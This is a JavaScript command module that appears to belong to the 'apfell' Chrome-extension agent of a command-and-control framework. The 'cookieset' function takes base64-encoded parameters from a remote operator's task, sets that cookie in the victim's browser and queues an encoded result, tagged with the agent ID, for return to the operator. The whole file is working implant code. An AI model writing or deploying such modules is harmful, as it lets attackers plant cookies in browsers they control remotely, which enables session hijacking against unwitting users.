cookieset = function(task) {
    let details = JSON.parse(atob(task['params'].toString()));
    chrome.cookies.set(details, function(cookie){
        let resp;
        if (cookie === null) {
            resp = JSON.stringify(chrome.runtime.lastError);
        } else {
            resp = JSON.stringify(cookie, null, 2);
        }

        response = {'task_id':task['task_id'], 'user_output':resp, 'completed':true};
        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        enc = JSON.stringify(outer_response);
        final = apfell.apfellid + enc;
        msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });
};

C2.commands[cookieset.name] = cookieset;
COMMAND_ENDS_HERE
